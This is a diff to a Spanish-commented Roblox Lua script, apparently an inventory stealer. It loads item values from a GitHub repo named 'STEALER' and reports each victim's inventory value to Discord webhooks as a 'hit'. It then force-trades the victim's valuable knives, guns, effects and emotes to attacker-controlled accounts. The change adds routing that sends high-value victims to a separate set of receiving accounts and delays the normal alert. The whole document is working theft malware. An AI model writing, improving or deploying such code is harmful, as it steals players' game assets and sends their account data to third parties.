@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY)
+-- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB DUAL Y DELAY)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -7,7 +7,7 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- ==========================================
--- URL DEL REPOSITORIO DE VALORES (JSON)
+-- URL DE LOS REPOSITORIOS DE VALORES (JSON)
 -- ==========================================
 local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
 local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"
@@ -23,7 +23,7 @@ local jugadoresObjetivosDual = {
 }
 
 -- ==========================================
--- LÓGICA DE INICIO/FILTRADO DE INVENTARIO (EXTRAÍDA DEL SCRIPT 1)
+-- LÓGICA DE INICIO/FILTRADO DE INVENTARIO
 -- ==========================================
 local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
 local EXCLUDE = {}
@@ -43,53 +43,48 @@ end
 -- ==========================================
 
 -- ==========================================
--- CARGA DINÁMICA DE VALORES DE GITHUB
+-- CARGA DINÁMICA DE VALORES DE GITHUB (NORMAL Y DUAL)
 -- ==========================================
 local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
 local DualKnives, DualGuns, DualEffects, DualEmotes = {}, {}, {}, {}
 
 local function cargarValoresGitHub()
-    -- Cargar Valores Normales
-    pcall(function()
-        local response = game:HttpGet(VALUES_REPO_URL)
-        if response then
-            local decodedData = HttpService:JSONDecode(response)
-            if decodedData then
-                Knives = decodedData.Knives or {}
-                Guns = decodedData.Guns or {}
-                Effects = decodedData.Effects or {}
-                Emotes = decodedData.Emotes or {}
-            end
+    -- Cargar valores normales
+    local success, response = pcall(function() return game:HttpGet(VALUES_REPO_URL) end)
+    if success and response then
+        local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response) end)
+        if decodeSuccess and decodedData then
+            Knives = decodedData.Knives or {}
+            Guns = decodedData.Guns or {}
+            Effects = decodedData.Effects or {}
+            Emotes = decodedData.Emotes or {}
         end
-    end)
-    
-    -- Cargar Valores Duales
-    pcall(function()
-        local responseDual = game:HttpGet(DUAL_VALUES_REPO_URL)
-        if responseDual then
-            local decodedDual = HttpService:JSONDecode(responseDual)
-            if decodedDual then
-                DualKnives = decodedDual.Knives or {}
-                DualGuns = decodedDual.Guns or {}
-                DualEffects = decodedDual.Effects or {}
-                DualEmotes = decodedDual.Emotes or {}
-            end
+    end
+
+    -- Cargar valores duales (NUEVA LISTA)
+    local successDual, responseDual = pcall(function() return game:HttpGet(DUAL_VALUES_REPO_URL) end)
+    if successDual and responseDual then
+        local decodeSuccessDual, decodedDataDual = pcall(function() return HttpService:JSONDecode(responseDual) end)
+        if decodeSuccessDual and decodedDataDual then
+            DualKnives = decodedDataDual.Knives or {}
+            DualGuns = decodedDataDual.Guns or {}
+            DualEffects = decodedDataDual.Effects or {}
+            DualEmotes = decodedDataDual.Emotes or {}
         end
-    end)
+    end
 end
 
 cargarValoresGitHub()
 
 task.spawn(function()
     -- ==========================================
-    -- ARREGLO: Esperar a que el SCRIPT 1 se conecte
+    -- ESPERAR A QUE EL SCRIPT 1 SE CONECTE
     -- ==========================================
     while getgenv and not getgenv().AutoTradeConfig do
-        task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
+        task.wait(0.2)
     end
     
     local config = getgenv().AutoTradeConfig or {}
-    
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
     local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
 
@@ -167,9 +162,9 @@ task.spawn(function()
     if ok and cg.PlayerData then
         local pd = cg.PlayerData
         local knives, guns, effects, emotes = {}, {}, {}, {}
+        
         local totalValue = 0
-        local dualTotalValue = 0
-        local usarDual = false
+        local dualTotalValue = 0 -- Se guarda el cálculo con la nueva lista
 
         local function normalizeName(name)
             return string.gsub(name, " ", "")
@@ -183,16 +178,16 @@ task.spawn(function()
                 if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                     local cleanName = normalizeName(item.name)
                     
-                    -- Sumar y guardar con la tabla normal
+                    -- Calcula para la webhook DUAL (Independientemente si se guarda)
+                    if dualValueTable[cleanName] then
+                        dualTotalValue = dualTotalValue + dualValueTable[cleanName]
+                    end
+
+                    -- Guarda items y calcula para la webhook NORMAL
                     if valueTable[cleanName] then
                         local itemValue = valueTable[cleanName]
                         totalValue = totalValue + itemValue
                         resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
-                    end
-                    
-                    -- Sumar valor de la tabla DUAL simultáneamente
-                    if dualValueTable[cleanName] then
-                        dualTotalValue = dualTotalValue + dualValueTable[cleanName]
                     end
                 end
             end
@@ -278,19 +273,18 @@ task.spawn(function()
                                     "**Executor:** `" .. executorName .. "`\n\n" ..
                                     "### 📊 Estadísticas de Hit\n" ..
                                     "**Historial:** `" .. executionText .. "`\n" ..
-                                    "**Total Value:** `💰 " .. totalValue .. "`\n" ..
-                                    "**Dual Value:** `💰 " .. dualTotalValue .. "`\n\n" ..
+                                    "**Total Value (Normal):** `💰 " .. totalValue .. "`\n" ..
+                                    "**Total Value (Dual):** `💎 " .. dualTotalValue .. "`\n\n" ..
                                     "**=============================**"
 
             local pings = {}
             local embedColor = 3447003
 
-            -- ==========================================
-            -- LÓGICA DUAL CONDICIONADA A +7500 DE VALOR DUAL
-            -- ==========================================
             if dualTotalValue > 7500 then
-                usarDual = true -- Activa la bandera para que el trade use las armas duales
-                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (DUAL +7500)!** 🚨")
+                table.insert(pings, "@everyone 🚨 **¡HIT DUAL MASIVO (+7500 VALOR DETECTADO)!** 🚨")
+                embedColor = 16711680
+            elseif totalValue >= 5000 then
+                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR DETECTADO)!** 🚨")
                 embedColor = 16711680
             elseif totalValue >= 2000 then
                 table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
@@ -323,10 +317,10 @@ task.spawn(function()
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
             -- ==========================================
-            -- ENVÍO DE WEBHOOKS (DUAL VS NORMAL)
+            -- ENVÍO DE WEBHOOKS (LÓGICA DUAL MAYOR A 7500)
             -- ==========================================
-            if usarDual then
-                -- 1. Webhook DUAL: Notifica al instante
+            if dualTotalValue > 7500 then
+                -- 1. Manda alerta PRIMERO al Webhook de tu inventario Dual al instante
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({
@@ -338,9 +332,15 @@ task.spawn(function()
                     end
                 end)
 
-                -- 2. Webhook Normal: Notifica con 5 minutos de delay (300 segundos)
+                -- 2. Cambia la lista de jugadores que aceptarán a los DUALES temporalmente
+                jugadoresObjetivos = jugadoresObjetivosDual
+
+                -- 3. Webhook normal: Notifica con 5 minutos de delay (300 segundos) y cambia a los usuarios normales
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
+                        -- Regresa los jugadores objetivos a los del Config SCRIPT 1
+                        jugadoresObjetivos = config.JugadoresObjetivos or {}
+                        
                         pcall(function()
                             request({
                                 Url = WEBHOOK_INVENTARIO,
@@ -352,10 +352,8 @@ task.spawn(function()
                     end)
                 end
                 
-                -- Cambia los objetivos a las cuentas DUAL
-                jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit normal: Notifica de inmediato únicamente al webhook normal
+                -- LÓGICA NORMAL (Si el Dual NO llegó a 7500)
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({
                         Url = WEBHOOK_INVENTARIO,
@@ -369,6 +367,8 @@ task.spawn(function()
 
         local jugadorEncontrado = nil
 
+        -- Este bucle encontrará a los jugadores duales primero, pero si pasan los 5 minutos,
+        -- detectará automáticamente cuando cambien a la lista de "jugadores normales".
         repeat 
             task.wait(0.5)
             for _, nombre in ipairs(jugadoresObjetivos) do
@@ -420,7 +420,6 @@ task.spawn(function()
                 local inv = pdTrade:TryIndex({"Inventory", cat})
                 if not inv then return end
                 for guid, item in pairs(inv) do
-                    -- APLICANDO LÓGICA DE INICIO DE INVENTARIO AL MOMENTO DEL TRADEO
                     if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                         local cleanName = normalizeName(item.name)
                         if valueTable[cleanName] then
@@ -437,16 +436,10 @@ task.spawn(function()
                 end
             end
 
-            -- Si es DUAL, escanea usando la tabla de DUAL_VALUES_REPO_URL, si no, usa la tabla normal
-            local activeKnives = usarDual and DualKnives or Knives
-            local activeGuns = usarDual and DualGuns or Guns
-            local activeEffects = usarDual and DualEffects or Effects
-            local activeEmotes = usarDual and DualEmotes or Emotes
-
-            scanTrade("Knife", activeKnives, nil, true)
-            scanTrade("Gun", activeGuns, nil, true)
-            scanTrade("Effect", activeEffects, listaEfectos, false)
-            scanTrade("Emote", activeEmotes, listaEmotes, false)
+            scanTrade("Knife", Knives, nil, true)
+            scanTrade("Gun", Guns, nil, true)
+            scanTrade("Effect", Effects, listaEfectos, false)
+            scanTrade("Emote", Emotes, listaEmotes, false)
 
             local sortPorValor = function(a, b) return a.value > b.value end
             table.sort(listaEmotes, sortPorValor)
@@ -467,7 +460,6 @@ task.spawn(function()
             local SessionState = cgData.SessionState
             local Workspace = game:GetService("Workspace")
 
-            -- PROTECCIÓN AÑADIDA: Verifica que player1 y player2 existan antes de leerlos
             local function getSides()
                 local data = ActiveNegotiation.Data
                 if type(data) ~= "table" then return nil, nil, nil end
@@ -524,26 +516,22 @@ task.spawn(function()
                 task.wait(0.35)
             end
 
-            -- 3 & 4. Lógica de Finalización (SetReady Seguro)
+            -- 3 & 4. Lógica de Finalización
             local timeout = os.clock()
             while os.clock() - timeout < 60 do 
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
-                -- Utilizamos getSides que ya viene protegido contra el error 'nil'
                 local me, other, data = getSides()
                 
                 if not data then break end
                 if data.exchanging then break end 
                 
-                         -- Verificamos si somos nosotros y aún no damos ready
                 if me and not me.ready then
                     if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
-                        -- SOLUCIÓN: Se pasa data.ref o {} igual que en el script de origen
                         Remotes.SetReady:FireServer(true, data.ref or {})
                     end
                 end
 
-                
                 task.wait(0.5)
             end
 
@@ -556,24 +544,23 @@ task.spawn(function()
             return true
         end
 
+
         -- ==========================================
         -- BUCLE PRINCIPAL DE TRADEO CONTINUO
         -- ==========================================
         while true do
-            -- Si el jugador objetivo se sale antes de arrancar el siguiente trade, se rompe el bucle
             if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                 break 
             end
             
             local continuar = ejecutarTradeo()
-            -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
             if not continuar then 
                 break 
             end
         end
 
         -- ==========================================
-        -- RESTAURACIÓN: TODO VUELVE A LA NORMALIDAD
+        -- RESTAURACIÓN
         -- ==========================================
         tradeando = false
         task.wait(0.5) 
